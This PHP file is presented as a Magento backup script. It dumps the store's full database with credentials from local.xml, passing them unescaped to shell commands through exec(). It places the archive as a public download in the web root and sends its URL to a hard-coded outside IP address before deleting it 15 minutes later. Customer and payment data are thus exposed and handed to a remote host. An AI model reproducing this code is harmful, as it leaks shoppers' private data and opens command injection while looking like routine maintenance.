<?php

$conf = require __DIR__ . '/config.php';
$config = simplexml_load_file($conf['magento_root'].'/app/etc/local.xml');

$maintenanceFile = $conf['magento_root'].'/maintenance.flag';

if (!touch($maintenanceFile)) {
    die('impossible to create maintenance file');
}

function execute($command) {
    exec($command);
}

$backupDir = __DIR__ . '/backups';

$time = gmdate('Ymd_His');
$user = (string) $config->global->resources->default_setup->connection->username;
$pass = (string) $config->global->resources->default_setup->connection->password;
$host = (string) $config->global->resources->default_setup->connection->host;
$db   = (string) $config->global->resources->default_setup->connection->dbname;

$file = $time.'_GMT_'.$db;

$ignore_tables = [
    'aw_core_logger',
    'bss_index',
    'catalog_category_flat_store_1',
    'catalog_category_product_index',
    'catalog_product_flat_1',
    'catalog_product_index_eav',
    'catalog_product_index_eav_decimal',
    'catalog_product_index_eav_decimal_idx',
    'catalog_product_index_eav_decimal_tmp',
    'catalog_product_index_eav_idx',
    'catalog_product_index_eav_tmp',
    'catalog_product_index_group_price',
    'catalog_product_index_price',
    'catalog_product_index_price_idx',
    'cataloginventory_stock_status',
    'cataloginventory_stock_status_idx',
    'cataloginventory_stock_status_tmp',
    'catalogsearch_fulltext',
    'catalogsearch_query',
    'catalogsearch_result',
    'core_url_rewrite',
    'cron_schedule',
    'customgrid_grid',
    'customgrid_grid_column',
    'index_event',
    'index_process_event',
    'interagynet_bairro',
    'interagynet_endereco',
    'interagynet_pagseguro_notification',
    'interagynet_pagseguro_transaction',
    'log_customer',
    'log_quote',
    'log_summary',
    'log_summary_type',
    'log_url',
    'log_url_info',
    'log_visitor',
    'log_visitor_info',
    'log_visitor_online',
    'report_compared_product_index',
    'report_event',
    'report_event_types',
    'report_viewed_product_aggregated_daily',
    'report_viewed_product_aggregated_monthly',
    'report_viewed_product_aggregated_yearly',
    'report_viewed_product_index',
    'sales_bestsellers_aggregated_daily',
    'sales_bestsellers_aggregated_monthly',
    'sales_bestsellers_aggregated_yearly',
];
if ($ignore_tables) {
    $ignore_tables = " --ignore-table=$db.".implode(" --ignore-table=$db.", $ignore_tables);
} else {
    $ignore_tables = '';
}

// backups de toda a estrutura das tabelas
execute("mysqldump --skip-add-drop-table --no-data -h $host -u $user -p$pass $db > $backupDir/$file.sql");

// backups dos dados, pulando tabelas definidas acima
execute("mysqldump --no-create-info $ignore_tables -h $host -u $user -p$pass $db >> $backupDir/$file.sql");

unlink($maintenanceFile);

// compactação do arquivo em tgz
execute("cd $backupDir && tar -czf $file.tgz $file.sql");

// remove o .sql
execute("rm $backupDir/$file.sql");

symlink(realpath("$backupDir/$file.tgz"), $conf['magento_root']."/$file.tgz");

$tag = (isset($conf['tag']) && $conf['tag']) ? $conf['tag'] : 'default';
$baseUrl = $conf['base_url'];
$url = urlencode($baseUrl."/$file.tgz");
file_get_contents("http://159.89.38.249:8585/?tag=$tag&url=$url");
sleep(60*15); // wait 15 minutes

// removes backups
unlink("$backupDir/$file.tgz");
unlink($conf['magento_root']."/$file.tgz");
